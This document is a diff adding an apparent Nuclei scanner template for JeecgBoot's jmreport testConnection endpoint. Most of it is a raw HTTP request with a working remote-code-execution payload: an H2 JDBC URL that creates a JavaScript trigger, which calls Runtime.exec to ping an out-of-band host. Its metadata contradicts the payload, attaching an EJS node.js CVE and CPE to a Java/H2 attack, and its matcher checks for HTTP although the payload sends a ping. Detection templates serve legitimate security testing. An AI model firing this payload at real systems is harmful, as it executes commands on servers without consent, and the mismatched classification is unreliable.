@@ -1,0 +1,51 @@
+id: jeecg-boot-ssti
+
+info:
+  name: Jeecg boot - Template Injection
+  author: Co5mos
+  severity: critical
+  reference:
+    - https://c0olw.github.io/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2022-29078
+    cwe-id: CWE-74
+    epss-score: 0.02303
+    cpe: cpe:2.3:a:ejs:ejs:3.1.6:*:*:*:*:node.js:*:*
+  metadata:
+    max-request: 1
+    framework: node.js
+    vendor: ejs
+    product: ejs
+  tags: ssti,rce,oast,jeecg
+
+http:
+  - raw:
+      - |
+        POST /jeecgboot/jmreport/testConnection HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json;charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        {
+          "id": "1",
+          "code": "dataSource1",
+          "dbType": "H2",
+          "dbDriver": "org.h2.Driver",
+          "dbUrl": "jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('ping {{interactsh-url}}')\u000A$$",
+          "dbName": "test",
+          "dbUsername": "sa",
+          "dbPassword": "",
+          "connectTimes": 5
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - http
